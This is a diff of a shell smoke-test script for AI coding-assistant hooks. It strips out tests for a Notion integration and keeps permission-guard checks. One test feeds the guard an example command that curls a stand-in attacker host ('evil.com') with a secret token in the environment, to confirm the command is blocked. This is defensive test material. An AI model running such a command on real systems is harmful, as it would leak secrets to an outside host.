@@ -187,8 +187,6 @@ echo "$result" | grep -q "new-project" && ok "detects 'new project'" || fail "de
 result=$(echo '{"message":"newproject myapp"}' | PYTHONIOENCODING=utf-8 python "$HOOKS_DIR/task-classifier.py" 2>&1)
 echo "$result" | grep -q "new-project" && ok "detects 'newproject'" || fail "detects 'newproject' (got: $result)"
 
-result=$(echo '{"message":"set up notion for my new app"}' | PYTHONIOENCODING=utf-8 python "$HOOKS_DIR/task-classifier.py" 2>&1)
-echo "$result" | grep -q "new-project" && ok "detects 'set up notion'" || fail "detects 'set up notion' (got: $result)"
 
 result=$(echo '{"message":"start a new project for the blog"}' | PYTHONIOENCODING=utf-8 python "$HOOKS_DIR/task-classifier.py" 2>&1)
 echo "$result" | grep -q "new-project" && ok "detects 'start a new project'" || fail "detects 'start a new project' (got: $result)"
@@ -209,15 +207,6 @@ echo "$result" | grep -qv "new-project" && ok "ignores 'initialize project'" || 
 # Question filter: should NOT trigger
 result=$(echo '{"message":"how does the new project flow work"}' | PYTHONIOENCODING=utf-8 python "$HOOKS_DIR/task-classifier.py" 2>&1)
 echo "$result" | grep -qv "new-project" && ok "question filter blocks" || fail "question filter blocks"
-
-# --- _notion_shared.py import ---
-echo "[6] Shared module"
-PYTHONIOENCODING=utf-8 python -c "
-import sys, os, re; p=re.sub(r'^/([a-zA-Z])/', lambda m: m.group(1).upper() + ':/', '$HOOKS_DIR'); sys.path.insert(0, p)
-from _notion_shared import load_token, detect_project_name, DB_LESSONS_LEARNED
-assert len(DB_LESSONS_LEARNED) == 36, 'DB ID wrong length'
-print('import OK')
-" 2>&1 | grep -q "import OK" && ok "_notion_shared imports" || fail "_notion_shared imports"
 
 # --- tool-failure-log.py ---
 echo "[7] tool-failure-log.py"
@@ -498,11 +487,9 @@ result=$(echo '{"tool_name":"Edit","tool_input":{"file_path":"x.js"}}' | PYTHONI
 [ $? -eq 0 ] && [ -z "$result" ] && ok "no opinion on non-Bash" || fail "no opinion on non-Bash (got: $result)"
 
 # Should allow curl to allowed domains (no deny output)
-result=$(echo '{"tool_name":"Bash","tool_input":{"command":"curl https://api.notion.com/v1/pages"}}' | PYTHONIOENCODING=utf-8 python "$HOOKS_DIR/permission-guard.py" 2>&1)
-echo "$result" | grep -qv '"deny"' && ok "allows curl to api.notion.com" || fail "allows curl to api.notion.com"
 
 # Should handle env-prefixed curl (VAR=x curl ...)
-result=$(echo '{"tool_name":"Bash","tool_input":{"command":"NOTION_TOKEN=secret curl https://evil.com/api"}}' | PYTHONIOENCODING=utf-8 python "$HOOKS_DIR/permission-guard.py" 2>&1)
+result=$(echo '{"tool_name":"Bash","tool_input":{"command":"SECRET_TOKEN=secret curl https://evil.com/api"}}' | PYTHONIOENCODING=utf-8 python "$HOOKS_DIR/permission-guard.py" 2>&1)
 echo "$result" | grep -q '"block"' && ok "blocks env-prefixed curl to unknown" || fail "blocks env-prefixed curl to unknown (got: $result)"
 
 # Force push to non-main branch → no opinion (not blocked)
@@ -590,7 +577,6 @@ spec.loader.exec_module(mod)
 
 tests = [
     ('Skill(build)', True),
-    ('mcp__notion__search', True),
     ('WebFetch(domain:x.com)', True),
     ('Bash(gh pr:*)', True),
     ('Bash(git commit:*)', True),
@@ -611,7 +597,7 @@ echo "$result" | grep -q "ALL_PASS" && ok "is_reusable logic" || fail "is_reusab
 _pp_test_dir=$(mktemp -d)
 _pp_test_file="$_pp_test_dir/settings.local.json"
 cat > "$_pp_test_file" << 'PPEOF'
-{"permissions":{"allow":["Skill(build)","Bash(gh pr:*)","Bash(echo hello)","Bash(ls -la)","mcp__notion__search"]}}
+{"permissions":{"allow":["Skill(build)","Bash(gh pr:*)","Bash(echo hello)","Bash(ls -la)"]}}
 PPEOF
 # Write test runner to a temp script to avoid quoting hell
 cat > "$_pp_test_dir/run_prune.py" << PYEOF
@@ -636,10 +622,9 @@ with open(test_file) as f:
     result = json.load(f)
 entries = result['permissions']['allow']
 ok = ('Skill(build)' in entries and 'Bash(gh pr:*)' in entries
-      and 'mcp__notion__search' in entries
       and 'Bash(echo hello)' not in entries
       and 'Bash(ls -la)' not in entries
-      and len(entries) == 3)
+      and len(entries) == 2)
 print('PRUNE_OK' if ok else f'FAIL: {entries}')
 PYEOF
 result=$(PYTHONIOENCODING=utf-8 python "$_pp_test_dir/run_prune.py" "$_pp_test_file" 2>&1)
@@ -705,178 +690,6 @@ result=$(echo '{"session_id":"test-cw-no-ctx"}' | PYTHONIOENCODING=utf-8 python 
 
 # Clean up
 echo '{}' > "$HOME/.claude/context-toast-state.json"
-
-# --- [23a] _notion_shared.py ---
-echo "[23a] _notion_shared.py"
-
-# load_token: reads from temp .env
-TEMP_ENV=$(PYTHONIOENCODING=utf-8 python -c "import tempfile, os; f=tempfile.NamedTemporaryFile(mode='w',suffix='.env',delete=False,dir=os.environ.get('TEMP','/tmp')); f.write('NOTION_TOKEN=ntn_test123\n'); f.close(); print(f.name)")
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys, os
-sys.path.insert(0, '$HOOKS_DIR_PY')
-import _notion_shared as ns
-ns.ENV_PATH = r'$TEMP_ENV'
-t = ns.load_token()
-print('OK' if t == 'ntn_test123' else f'FAIL:{t}')
-")
-[ "$result" = "OK" ] && ok "load_token reads valid token" || fail "load_token reads valid token ($result)"
-
-# load_token: returns None for placeholder token
-echo 'NOTION_TOKEN=YOUR_TOKEN_HERE' > "$TEMP_ENV"
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys, os
-sys.path.insert(0, '$HOOKS_DIR_PY')
-import _notion_shared as ns
-ns.ENV_PATH = r'$TEMP_ENV'
-t = ns.load_token()
-print('OK' if t is None else f'FAIL:{t}')
-")
-[ "$result" = "OK" ] && ok "load_token rejects placeholder" || fail "load_token rejects placeholder ($result)"
-rm -f "$TEMP_ENV"
-
-# detect_project_name: returns None for home dir
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys, os
-sys.path.insert(0, '$HOOKS_DIR_PY')
-import _notion_shared as ns
-home = os.path.expanduser('~').replace(chr(92), '/')
-p = ns.detect_project_name({'cwd': home})
-print('OK' if p is None else f'FAIL:{p}')
-")
-[ "$result" = "OK" ] && ok "detect_project_name: None for home dir" || fail "detect_project_name: None for home dir ($result)"
-
-# notion_headers: returns correct structure
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys; sys.path.insert(0, '$HOOKS_DIR_PY')
-from _notion_shared import notion_headers
-h = notion_headers('tok123')
-ok = h.get('Authorization') == 'Bearer tok123' and 'Notion-Version' in h and 'Content-Type' in h
-print('OK' if ok else 'FAIL')
-")
-[ "$result" = "OK" ] && ok "notion_headers structure" || fail "notion_headers structure ($result)"
-
-# --- [23b] notion-capture.py (pure functions) ---
-echo "[23b] notion-capture.py (pure functions)"
-
-# _is_error: detects error patterns
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys; sys.path.insert(0, '$HOOKS_DIR_PY')
-import importlib
-mod = importlib.import_module('notion-capture')
-checks = [
-    mod._is_error('Error: file not found') == True,
-    mod._is_error('FAILED to connect') == True,
-    mod._is_error('status 500 internal') == True,
-    mod._is_error('everything is fine') == False,
-    mod._is_error('Permission denied') == True,
-]
-print('OK' if all(checks) else f'FAIL:{checks}')
-")
-[ "$result" = "OK" ] && ok "_is_error detects patterns" || fail "_is_error detects patterns ($result)"
-
-# _strip_pii: redacts emails and phone numbers
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys; sys.path.insert(0, '$HOOKS_DIR_PY')
-import importlib
-mod = importlib.import_module('notion-capture')
-checks = [
-    '[REDACTED]' in mod._strip_pii('Contact user@example.com for help'),
-    '[REDACTED]' in mod._strip_pii('Call 555-123-4567 now'),
-    mod._strip_pii('no pii here') == 'no pii here',
-]
-print('OK' if all(checks) else f'FAIL:{checks}')
-")
-[ "$result" = "OK" ] && ok "_strip_pii redacts PII" || fail "_strip_pii redacts PII ($result)"
-
-# _normalize_text: strips markdown formatting
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys; sys.path.insert(0, '$HOOKS_DIR_PY')
-import importlib
-mod = importlib.import_module('notion-capture')
-bt = chr(96)  # backtick without bash confusion
-checks = [
-    'bold text' in mod._normalize_text('**bold text**'),
-    'code' in mod._normalize_text(bt + 'code' + bt),
-    '  ' not in mod._normalize_text('lots   of   spaces'),
-]
-print('OK' if all(checks) else f'FAIL:{checks}')
-")
-[ "$result" = "OK" ] && ok "_normalize_text strips markdown" || fail "_normalize_text strips markdown ($result)"
-
-# is_trivial_session: too few messages
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys; sys.path.insert(0, '$HOOKS_DIR_PY')
-import importlib
-mod = importlib.import_module('notion-capture')
-trivial = mod.is_trivial_session({'user_messages': ['hi'], 'first_ts': None, 'last_ts': None})
-non_trivial = mod.is_trivial_session({'user_messages': ['a','b','c','d'], 'first_ts': None, 'last_ts': None})
-print('OK' if trivial and not non_trivial else f'FAIL:trivial={trivial},non_trivial={non_trivial}')
-")
-[ "$result" = "OK" ] && ok "is_trivial_session threshold" || fail "is_trivial_session threshold ($result)"
-
-# _is_technical_term: filters common words vs technical terms
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys; sys.path.insert(0, '$HOOKS_DIR_PY')
-import importlib
-mod = importlib.import_module('notion-capture')
-bt = chr(96)
-checks = [
-    mod._is_technical_term('CRLF', 'about CRLF') == True,
-    mod._is_technical_term('node_modules', 'clean node_modules') == True,
-    mod._is_technical_term('this', 'use this') == False,
-    mod._is_technical_term('TOCTOU', bt + 'TOCTOU' + bt + ' race') == True,
-]
-print('OK' if all(checks) else f'FAIL:{checks}')
-")
-[ "$result" = "OK" ] && ok "_is_technical_term filters" || fail "_is_technical_term filters ($result)"
-
-# notion-capture.py: exits 0 with no token (graceful degradation)
-result=$(echo '{"session_id":"test-nc-notoken"}' | PYTHONIOENCODING=utf-8 python -c "
-import sys, os
-sys.path.insert(0, '$HOOKS_DIR_PY')
-import _notion_shared as ns
-ns.ENV_PATH = '/nonexistent/.env'
-import importlib
-mod = importlib.import_module('notion-capture')
-mod.load_token = ns.load_token
-mod.main()
-" 2>/dev/null)
-[ $? -eq 0 ] && ok "exits 0 with no token" || fail "exits 0 with no token"
-
-# --- [23c] notion-recall.py (pure functions) ---
-echo "[23c] notion-recall.py"
-
-# get_text: extracts from Notion property types
-result=$(PYTHONIOENCODING=utf-8 python -c "
-import sys; sys.path.insert(0, '$HOOKS_DIR_PY')
-import importlib
-mod = importlib.import_module('notion-recall')
-checks = [
-    mod.get_text({'type':'title','title':[{'plain_text':'Hello'}]}) == 'Hello',
-    mod.get_text({'type':'rich_text','rich_text':[{'plain_text':'World'}]}) == 'World',
-    mod.get_text({'type':'select','select':{'name':'Bug'}}) == 'Bug',
-    mod.get_text({'type':'multi_select','multi_select':[{'name':'A'},{'name':'B'}]}) == 'A, B',
-    mod.get_text(None) == '',
-    mod.get_text({}) == '',
-]
-print('OK' if all(checks) else f'FAIL:{checks}')
-")
-[ "$result" = "OK" ] && ok "get_text extracts all property types" || fail "get_text extracts all property types ($result)"
-
-# notion-recall.py: exits 0 with no token, no output
-# Override _notion_shared.ENV_PATH to a non-existent file so load_token returns None
-result=$(echo '{"trigger":"test"}' | PYTHONIOENCODING=utf-8 python -c "
-import sys, os
-sys.path.insert(0, '$HOOKS_DIR_PY')
-import _notion_shared as ns
-ns.ENV_PATH = '/nonexistent/.env'
-import importlib
-mod = importlib.import_module('notion-recall')
-mod.load_token = ns.load_token  # Use patched version
-mod.main()
-" 2>/dev/null)
-rc=$?
-[ $rc -eq 0 ] && [ -z "$result" ] && ok "exits 0, no output without token" || fail "exits 0, no output without token (rc=$rc, out=$result)"
 
 # --- [23] protect-files.sh ---
 echo "[23] protect-files.sh"
@@ -2440,7 +2253,7 @@ spec = importlib.util.spec_from_file_location('hhf', os.path.expanduser('~/.clau
 hhf = importlib.util.module_from_spec(spec)
 try: spec.loader.exec_module(hhf)
 except SystemExit: pass
-log_data = {'audit': {}, 'quality_gate': [], 'task_class': [], 'notion_cap': []}
+log_data = {'audit': {}, 'quality_gate': [], 'task_class': []}
 cfg = {'log': 'hook-audit.log', 'max_age': None}
 entry = hhf.build_hook_entry('event-observer', cfg, log_data, time.time(), False, set())
 assert isinstance(entry, dict) and 'status' in entry
@@ -2950,66 +2763,6 @@ assert isinstance(h_empty, str), f'expected str, got: {type(h_empty)}'
 assert len(h_empty) >= 8, f'expected >= 8 chars for empty hash, got: {len(h_empty)}'
 print('token_ok')
 SMOKE89_6EOF
-
-echo "[90] notion-commit-reminder.py"
-# Test 1: git commit triggers additionalContext injection
-PYTHONIOENCODING=utf-8 python << 'SMOKE90_1EOF' 2>/dev/null | grep -q commit_reminder_ok && ok "notion-commit-reminder: git commit injects additionalContext" || fail "notion-commit-reminder: git commit injects additionalContext"
-import importlib.util, os, sys, json, io
-sys.stdin = io.StringIO(json.dumps({'tool_input': {'command': 'git commit -m "fix: update auth"'}}))
-import importlib.util
-spec = importlib.util.spec_from_file_location('ncr', os.path.expanduser('~/.claude/hooks/notion-commit-reminder.py'))
-ncr = importlib.util.module_from_spec(spec)
-out = io.StringIO()
-import contextlib
-with contextlib.redirect_stdout(out):
-    try: spec.loader.exec_module(ncr)
-    except SystemExit: pass
-result = out.getvalue().strip()
-assert result, f'expected JSON output for git commit, got empty'
-data = json.loads(result)
-ctx = data.get('hookSpecificOutput', {}).get('additionalContext', '')
-assert 'notion-commit-reminder' in ctx, f'missing reminder tag in: {ctx!r}'
-print('commit_reminder_ok')
-SMOKE90_1EOF
-# Test 2: git commit --no-commit does NOT trigger
-PYTHONIOENCODING=utf-8 python << 'SMOKE90_2EOF' 2>/dev/null | grep -q nocommit_ok && ok "notion-commit-reminder: --no-commit suppresses output" || fail "notion-commit-reminder: --no-commit suppresses output"
-import importlib.util, os, sys, json, io, contextlib
-sys.stdin = io.StringIO(json.dumps({'tool_input': {'command': 'git commit --no-commit'}}))
-spec = importlib.util.spec_from_file_location('ncr', os.path.expanduser('~/.claude/hooks/notion-commit-reminder.py'))
-ncr = importlib.util.module_from_spec(spec)
-out = io.StringIO()
-with contextlib.redirect_stdout(out):
-    try: spec.loader.exec_module(ncr)
-    except SystemExit: pass
-assert out.getvalue().strip() == '', f'expected no output for --no-commit, got: {out.getvalue()!r}'
-print('nocommit_ok')
-SMOKE90_2EOF
-# Test 3: non-commit bash command produces no output
-PYTHONIOENCODING=utf-8 python << 'SMOKE90_3EOF' 2>/dev/null | grep -q nongit_ok && ok "notion-commit-reminder: non-commit command produces no output" || fail "notion-commit-reminder: non-commit command produces no output"
-import importlib.util, os, sys, json, io, contextlib
-sys.stdin = io.StringIO(json.dumps({'tool_input': {'command': 'git status'}}))
-spec = importlib.util.spec_from_file_location('ncr', os.path.expanduser('~/.claude/hooks/notion-commit-reminder.py'))
-ncr = importlib.util.module_from_spec(spec)
-out = io.StringIO()
-with contextlib.redirect_stdout(out):
-    try: spec.loader.exec_module(ncr)
-    except SystemExit: pass
-assert out.getvalue().strip() == '', f'expected no output for git status, got: {out.getvalue()!r}'
-print('nongit_ok')
-SMOKE90_3EOF
-# Test 4: invalid JSON input exits cleanly (no crash)
-PYTHONIOENCODING=utf-8 python << 'SMOKE90_4EOF' 2>/dev/null | grep -q invalid_ok && ok "notion-commit-reminder: invalid JSON input exits cleanly" || fail "notion-commit-reminder: invalid JSON input exits cleanly"
-import importlib.util, os, sys, io, contextlib
-sys.stdin = io.StringIO('not valid json')
-spec = importlib.util.spec_from_file_location('ncr', os.path.expanduser('~/.claude/hooks/notion-commit-reminder.py'))
-ncr = importlib.util.module_from_spec(spec)
-out = io.StringIO()
-with contextlib.redirect_stdout(out):
-    try: spec.loader.exec_module(ncr)
-    except SystemExit: pass
-assert out.getvalue().strip() == '', f'expected no output for invalid JSON, got: {out.getvalue()!r}'
-print('invalid_ok')
-SMOKE90_4EOF
 
 echo "[91] smoke-count-updater.py"
 # Test 1: non-Bash tool_name is a no-op
@@ -4781,8 +4534,8 @@ hooks = [
     'context-watch.py', 'stop-log.py', 'stop-failure-log.py',
     'tool-failure-log.py', 'session-end-log.py', 'event-observer.py',
     'pre-compact-snapshot.py', 'prune-permissions.py',
-    'notion-recall.py', 'notion-capture.py', 'protect-files.sh',
-    '_hooks_shared.py', '_notion_shared.py',
+      'protect-files.sh',
+    '_hooks_shared.py', 
 ]
 
 # Parse sections: find headers like echo \"[N] hook-name\"
